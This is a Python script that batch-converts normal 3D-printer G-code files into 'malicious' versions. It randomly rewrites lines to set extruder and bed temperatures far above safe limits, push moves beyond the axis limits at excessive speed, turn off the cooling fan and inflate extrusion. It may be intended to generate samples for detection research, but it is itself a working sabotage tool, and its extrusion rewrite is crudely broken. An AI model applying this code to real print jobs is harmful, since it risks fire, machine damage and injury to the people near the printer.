import os
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm  # Import tqdm for the progress bar

# Parameters to define malicious behaviors
MAX_HOTEND_TEMP = 260  # Safe extruder temperature limit
MAX_BED_TEMP = 120     # Safe bed temperature limit
MAX_X = 220            # Safe X-axis movement limit
MAX_Y = 220            # Safe Y-axis movement limit
MAX_Z = 250            # Safe Z-axis movement limit
MAX_SPEED = 5000       # Safe speed limit for movements
MAX_EXTRUSION = 100    # Safe extrusion limit

# Directory paths
input_dir = 'demo'  # Directory containing good G-code files
output_dir = 'demo'  # Directory to save malicious G-code files

# Ensure output directory exists
os.makedirs(output_dir, exist_ok=True)

# Function to introduce malicious modifications to a G-code line
def make_malicious(line):
    # Parse the G-code command
    if line.startswith('M104') or line.startswith('M109'):  # Extruder temp commands
        # Set a dangerously high extruder temperature
        return f"M104 S{MAX_HOTEND_TEMP + random.randint(20, 100)}\n"

    elif line.startswith('M140') or line.startswith('M190'):  # Bed temp commands
        # Set a dangerously high bed temperature
        return f"M140 S{MAX_BED_TEMP + random.randint(20, 100)}\n"

    elif line.startswith('G1'):  # Movement commands
        # Randomly modify position to exceed physical limits
        x = random.uniform(MAX_X + 10, MAX_X + 50)
        y = random.uniform(MAX_Y + 10, MAX_Y + 50)
        z = random.uniform(MAX_Z + 10, MAX_Z + 50)
        return f"G1 X{x:.2f} Y{y:.2f} Z{z:.2f} F{MAX_SPEED + random.randint(2000, 5000)}\n"
    
    elif line.startswith('M106'):  # Fan speed
        # Set a fan speed to 0, which may cause overheating
        return "M106 S0\n"
    
    elif 'E' in line:  # Extrusion commands
        # Set an excessive extrusion amount
        return line.replace('E', f"E{MAX_EXTRUSION + random.uniform(10, 50)}")

    # If no malicious behavior is added, return the original line
    return line

# Function to process a single G-code file and generate a malicious version
def process_gcode_file(filename):
    input_path = os.path.join(input_dir, filename)
    output_path = os.path.join(output_dir, f"malicious_{filename}")

    try:
        with open(input_path, 'r') as infile, open(output_path, 'w') as outfile:
            for line in infile:
                # Randomly decide whether to modify this line to make it malicious
                if random.random() < 0.1:  # 10% chance to modify each line
                    outfile.write(make_malicious(line))
                else:
                    outfile.write(line)
    except Exception as e:
        print(f"Error processing file '{filename}': {str(e)}")

# Function to process all G-code files in the input directory using multithreading
def process_all_gcode_files():
    # List of all G-code files in the input directory
    gcode_files = [filename for filename in os.listdir(input_dir) if filename.endswith(".gcode")]

    # Use ThreadPoolExecutor to process files in parallel
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(process_gcode_file, filename): filename for filename in gcode_files}

        # Add a progress bar
        with tqdm(total=len(gcode_files), desc="Processing G-code files") as pbar:
            # Wait for all threads to complete
            for future in as_completed(futures):
                filename = futures[future]
                try:
                    future.result()
                    pbar.update(1)  # Update progress bar
                    print(f"Processed: {filename}")
                except Exception as e:
                    print(f"Error processing file '{filename}': {str(e)}")

# Process all G-code files in the input directory
process_all_gcode_files()

print(f"Malicious G-code files have been generated in the '{output_dir}' directory.")
